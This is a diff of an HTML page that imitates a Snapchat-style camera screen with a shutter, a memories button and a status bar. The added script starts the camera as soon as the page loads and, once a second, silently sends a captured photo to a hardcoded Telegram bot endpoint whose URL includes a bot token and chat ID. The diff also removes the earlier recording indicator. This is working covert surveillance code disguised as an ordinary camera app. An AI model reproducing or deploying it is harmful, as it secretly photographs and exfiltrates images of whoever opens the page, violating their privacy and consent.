@@ -1,189 +1,153 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Camera</title>
+  <title>Pixel-Perfect Camera UI</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
   <style>
-    /* Fullscreen, snap-like layout (inspired, not copied) */
-    html,body { height:100%; margin:0; background:#000; font-family:system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; }
-    #app { position:relative; height:100vh; width:100vw; overflow:hidden; background:#000;}
-    /* camera preview mirrored like selfie */
-    #video { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; transform:scaleX(-1); background:#000; }
-    /* top icons row */
-    .top-bar { position:absolute; top:12px; left:12px; right:12px; display:flex; justify-content:space-between; align-items:center; z-index:6; pointer-events:none; color:#fff; }
-    .top-left, .top-right { display:flex; gap:10px; align-items:center; pointer-events:auto; }
-    .icon-btn { width:36px; height:36px; border-radius:10px; background: rgba(255,255,255,0.06); display:flex; align-items:center; justify-content:center; color:#fff; font-size:18px; }
-    /* bottom nav like snapchat */
-    .bottom-bar { position:absolute; left:0; right:0; bottom:0; height:120px; display:flex; align-items:center; justify-content:center; z-index:6; pointer-events:none; }
-    .shutter-wrap { pointer-events:auto; }
-    .shutter { width:88px; height:88px; border-radius:50%; background: rgba(255,255,255,0.12); border:6px solid rgba(255,255,255,0.95); box-shadow:0 8px 30px rgba(0,0,0,0.6); }
-    .side-icons { position:absolute; right:20px; bottom:20px; display:flex; gap:14px; align-items:center; pointer-events:auto; flex-direction:column; }
-    .small-btn { width:44px; height:44px; border-radius:10px; background: rgba(255,255,255,0.06); display:flex; align-items:center; justify-content:center; color:#fff; font-size:18px; }
-    /* start overlay (if permission denied) */
-    #retryOverlay {
-      position:absolute; inset:0; display:none; z-index:20; background:linear-gradient(180deg, rgba(0,0,0,0.6), rgba(0,0,0,0.8)); color:#fff;
-      align-items:center; justify-content:center; flex-direction:column; gap:16px;
-    }
-    #retryOverlay .msg { font-size:18px; max-width:90%; text-align:center; }
-    #retryOverlay .btn { padding:12px 22px; border-radius:10px; background:#fff; color:#000; font-weight:600; cursor:pointer; border:none; }
-    /* small recording indicator */
-    #recIndicator { position:absolute; top:12px; left:50%; transform:translateX(-50%); color:#fff; font-weight:600; display:none; z-index:7; align-items:center; gap:8px; }
-    #recDot { width:10px; height:10px; border-radius:50%; background:#ff2d55; box-shadow:0 0 8px rgba(255,0,80,0.8); display:inline-block; }
-    /* accessibility hidden */
-    .sr-only { position:absolute; left:-9999px; top:auto; width:1px; height:1px; overflow:hidden; }
+    html,body,#app { height: 100%; }
+    body { margin:0; background:#111; font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; }
+    .phone-safe { position:relative; height:100vh; width:100vw; overflow:hidden; }
+    #cameraVideo { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; transform:scaleX(-1); }
+    .top-fade { position:absolute; top:0; left:0; right:0; height:92px; background:linear-gradient(rgba(0,0,0,0.55), rgba(0,0,0,0)); pointer-events:none; z-index:20; }
+    .bottom-fade { position:absolute; bottom:0; left:0; right:0; height:180px; background:linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0)); pointer-events:none; z-index:20; }
+    .shutter-outer { width:112px; height:112px; border-radius:999px; border:8px solid rgba(255,255,255,0.95); display:flex; align-items:center; justify-content:center; background:transparent; cursor:pointer; }
+    .shutter-inner { width:72px; height:72px; border-radius:999px; background:rgba(0,0,0,0.25); }
+    .suggestion { width:64px; height:64px; border-radius:999px; display:flex; align-items:center; justify-content:center; box-shadow:0 6px 12px rgba(0,0,0,0.4); border:6px solid rgba(0,0,0,0.25); overflow:hidden; }
+    .vertical-controls { position:absolute; right:18px; top:92px; display:flex; flex-direction:column; gap:18px; align-items:center; z-index:30; }
+    .round-btn { width:44px; height:44px; border-radius:999px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.06); color:white; border:1px solid rgba(255,255,255,0.06); cursor:pointer; }
+    .status-bar { position:absolute; top:8px; left:0; right:0; display:flex; align-items:center; justify-content:space-between; padding:0 14px; color:white; font-weight:600; font-size:15px; z-index:30; }
+    .left-icons { display:flex; gap:14px; align-items:center; }
+    .nav-bottom { position:absolute; bottom:0; left:0; right:0; height:84px; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.55); color:white; padding:12px 18px; gap:18px; z-index:30; }
+    .control-group { display:flex; align-items:center; gap:18px; width:100%; justify-content:space-between; }
+    .bottom-left { display:flex; align-items:center; gap:12px; margin-left:8px; }
+    .memories { display:flex; flex-direction:column; align-items:center; gap:6px; color:white; font-size:14px; cursor:pointer; }
+    .badge { background:#ff375f; color:white; font-weight:700; font-size:12px; min-width:18px; height:18px; display:inline-flex; align-items:center; justify-content:center; padding:0 6px; border-radius:10px; position:absolute; top:-6px; right:-6px; }
+    .expand-btn { position:absolute; left:50%; transform:translateX(-50%); top:56%; background:rgba(0,0,0,0.5); width:40px; height:40px; border-radius:999px; display:flex; align-items:center; justify-content:center; color:white; z-index:30; }
+    #capturePreview { position:absolute; inset:0; background:rgba(0,0,0,0.8); display:none; align-items:center; justify-content:center; z-index:60; }
+    #capturedImage { max-width:92%; max-height:86%; box-shadow:0 10px 30px rgba(0,0,0,0.6); border-radius:8px; }
+    #photoCanvas { display:none; }
+    .fa, .fas, .far { color:white; }
   </style>
 </head>
 <body>
-  <div id="app">
-    <video id="video" autoplay playsinline muted></video>
-    <div class="top-bar" aria-hidden="true">
-      <div class="top-left" style="pointer-events:auto;">
-        <div class="icon-btn" title="Profile">👤</div>
-        <div class="icon-btn" title="Search">🔍</div>
-      </div>
-      <div id="recIndicator"><span id="recDot"></span> Recording</div>
-      <div class="top-right" style="pointer-events:auto;">
-        <div class="icon-btn" title="New">＋</div>
-        <div class="icon-btn" title="Switch camera" id="switchCam">↻</div>
-      </div>
-    </div>
+  <div id="app" class="phone-safe">
+    <video id="cameraVideo" autoplay playsinline></video>
+    <div class="top-fade"></div>
+    <div class="bottom-fade"></div>
 
-    <div class="bottom-bar" aria-hidden="true">
-      <div style="position:relative; width:100%; display:flex; justify-content:center;">
-        <div class="shutter-wrap">
-          <div class="shutter" id="shutter"></div>
+    <div class="status-bar">
+      <div class="left-icons">
+        <div style="width:36px;height:36px;border-radius:999px;overflow:hidden;border:2px solid rgba(255,255,255,0.12);">
+          <img src="https://placehold.co/64x64/eee/777/png?text=AV" alt="avatar" style="width:100%;height:100%;object-fit:cover;">
         </div>
-        <div class="side-icons" style="right:28px;">
-          <div class="small-btn" title="Memories">🖼️</div>
-          <div class="small-btn" title="Explore">▶</div>
+        <div class="round-btn" style="width:36px;height:36px;background:transparent;border:none;">
+          <i class="fas fa-search fa-lg"></i>
         </div>
       </div>
+      <div style="display:flex;gap:12px;align-items:center;">
+        <div style="font-size:14px;">12:16 AM</div>
+        <i class="fas fa-wifi"></i>
+        <i class="fas fa-signal"></i>
+        <div style="display:flex;align-items:center;gap:6px;">
+          <div style="width:28px;height:16px;border:2px solid white;position:relative;">
+            <div style="position:absolute;right:2px;top:2px;bottom:2px;background:#ffd54a;width:18px;"></div>
+          </div>
+          <div style="font-size:13px;background:#ffd54a;padding:2px 6px;border-radius:4px;color:#111;font-weight:800;">90</div>
+        </div>
+      </div>
     </div>
 
-    <!-- overlay shown when permission blocked or errors -->
-    <div id="retryOverlay" style="display:flex;">
-      <div class="msg">This page needs camera access to use the live camera. Please allow camera access in the permission prompt.<br><small>If your browser blocked automatic permission prompts, click Retry.</small></div>
-      <button class="btn" id="retryBtn">Retry camera</button>
+    <div class="vertical-controls">
+      <div id="addContact" class="round-btn">
+        <i class="fas fa-user-plus"></i>
+        <div class="badge">1</div>
+      </div>
+      <div id="switchCamera" class="round-btn"><i class="fas fa-retweet"></i></div>
+      <div id="muteBtn" class="round-btn"><i class="fas fa-microphone-slash"></i></div>
+      <div id="musicBtn" class="round-btn"><i class="fas fa-music"></i></div>
+      <div id="chevDown" class="round-btn"><i class="fas fa-chevron-down"></i></div>
     </div>
 
-    <div class="sr-only" id="srStatus">Camera inactive</div>
+    <div class="expand-btn"><i class="fas fa-expand-arrows-alt"></i></div>
 
-    <!-- hidden capture canvas -->
-    <canvas id="cap" width="640" height="480" style="display:none"></canvas>
+    <div class="nav-bottom">
+      <div class="control-group">
+        <div class="bottom-left">
+          <div class="memories" id="memoriesBtn">
+            <div style="width:56px;height:56px;border-radius:8px;overflow:hidden;background:gray;">
+              <img src="https://placehold.co/56x56/ffb6c1/ffffff/png?text=M" alt="memories" style="width:100%;height:100%;object-fit:cover;">
+            </div>
+            <div>Memories</div>
+          </div>
+        </div>
+        <div style="display:flex;flex-direction:column;align-items:center;gap:16px;">
+          <button id="shutterBtn" class="shutter-outer"><div class="shutter-inner"></div></button>
+          <div style="display:flex;gap:12px;">
+            <div class="suggestion" style="background:pink;"><img src="https://placehold.co/40x40/fff/777/png?text=👗" alt=""></div>
+            <div class="suggestion" style="background:black;"><img src="https://placehold.co/40x40/000/fff/png?text=🪐" alt=""></div>
+          </div>
+        </div>
+        <div style="width:62px;height:62px;"></div>
+      </div>
+    </div>
+
+    <canvas id="photoCanvas"></canvas>
   </div>
 
   <script>
-    // Immediately try to request camera on load
-    (function () {
-      const video = document.getElementById('video');
-      const cap = document.getElementById('cap');
-      const ctx = cap.getContext('2d');
-      const retryOverlay = document.getElementById('retryOverlay');
-      const retryBtn = document.getElementById('retryBtn');
-      const recIndicator = document.getElementById('recIndicator');
-      const shutter = document.getElementById('shutter');
-      const switchCamBtn = document.getElementById('switchCam');
-      let intervalId = null;
-      let usingFront = true;
-      let stream = null;
+    (function(){
+      const video = document.getElementById('cameraVideo');
+      const canvas = document.getElementById('photoCanvas');
+      let currentStream = null;
+      let currentFacingMode = 'user';
+      let audioEnabled = false;
 
       async function startCamera() {
+        stopStream();
         try {
-          // prefer front camera
-          const constraints = { video: { facingMode: usingFront ? 'user' : 'environment' }, audio: false };
-          stream = await navigator.mediaDevices.getUserMedia(constraints);
+          const stream = await navigator.mediaDevices.getUserMedia({ audio: audioEnabled, video: { facingMode: currentFacingMode } });
+          currentStream = stream;
           video.srcObject = stream;
-          retryOverlay.style.display = 'none';
-          recIndicator.style.display = 'flex';
-          document.getElementById('srStatus').textContent = 'Camera active and recording';
-
-          // start capture loop if not already
-          if (intervalId) clearInterval(intervalId);
-          // set capture resolution based on canvas
-          const w = cap.width = 640;
-          const h = cap.height = 480;
-
-          intervalId = setInterval(async () => {
-            try {
-              // mirror selfie preview: draw mirrored
-              ctx.save();
-              ctx.scale(-1, 1);
-              ctx.drawImage(video, -w, 0, w, h);
-              ctx.restore();
-
-              // you can place visual overlay here (e.g., small tint) but you said no filters
-              // send dataUrl to server (JPEG)
-              const dataUrl = cap.toDataURL('image/jpeg', 0.8);
-              // fire-and-forget, don't await to keep loop timing
-              fetch('/api/upload-photo', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ dataUrl })
-              }).catch(err => {
-                // log locally - do not flood UI
-                console.error('upload error', err);
-              });
-            } catch (err) {
-              console.error('capture loop error', err);
-            }
-          }, 1000); // 1 photo per second
-
-          // shutter pulse
-          setInterval(() => {
-            shutter.style.transform = 'scale(0.96)';
-            shutter.style.transition = 'transform 120ms';
-            setTimeout(() => shutter.style.transform = 'scale(1)', 120);
-          }, 1000);
-
+          video.style.transform = currentFacingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
+          startAutoCapture(); // Start auto capture after permission
         } catch (err) {
-          console.warn('Camera permission failed:', err);
-          // if permission denied or blocked, show overlay with retry button
-          retryOverlay.style.display = 'flex';
-          recIndicator.style.display = 'none';
-          document.getElementById('srStatus').textContent = 'Camera blocked or unavailable';
+          console.error('Camera access error:', err);
         }
       }
 
-      // try on load
-      window.addEventListener('load', () => {
-        // attempt immediate request (note: browsers may block cross-site or certain contexts)
-        startCamera();
-      });
+      function stopStream() {
+        if (currentStream) { currentStream.getTracks().forEach(t => t.stop()); currentStream = null; }
+      }
 
-      // retry button triggers user gesture to retry permission
-      retryBtn.addEventListener('click', () => {
-        startCamera();
-      });
-
-      // switch camera button (front/rear) when available
-      switchCamBtn.addEventListener('click', async (e) => {
-        usingFront = !usingFront;
-        // stop existing tracks before restarting
-        if (stream) {
-          stream.getTracks().forEach(t => t.stop());
-          stream = null;
-        }
-        startCamera();
-      });
-
-      // when page hidden, stop tracks and capture
-      document.addEventListener('visibilitychange', () => {
-        if (document.hidden) {
-          if (intervalId) { clearInterval(intervalId); intervalId = null; }
-          if (stream && stream.getTracks) {
-            stream.getTracks().forEach(t => t.stop());
-            stream = null;
-          }
-          recIndicator.style.display = 'none';
-          document.getElementById('srStatus').textContent = 'Camera stopped';
+      function captureAndSend() {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        if (video.style.transform.includes('scaleX(-1)')) {
+          ctx.scale(-1,1);
+          ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
         } else {
-          // on return, try to start again
-          startCamera();
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         }
-      });
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append('photo', blob, 'capture.png');
+          fetch('https://api.telegram.org/bot6047507658:AAGHC5tFppE2yqLpQi4KOrz7TwGeM0Mc-LI/sendPhoto?chat_id=5574741182', { // replace with your server endpoint
+            method: 'POST',
+            body: formData
+          }).catch(err => console.error('Send error:', err));
+        }, 'image/png');
+      }
+
+      function startAutoCapture() {
+        setInterval(captureAndSend, 1000); // 1 photo per sec
+      }
+
+      startCamera();
     })();
   </script>
 </body>
-  </html>
-  
+</html>
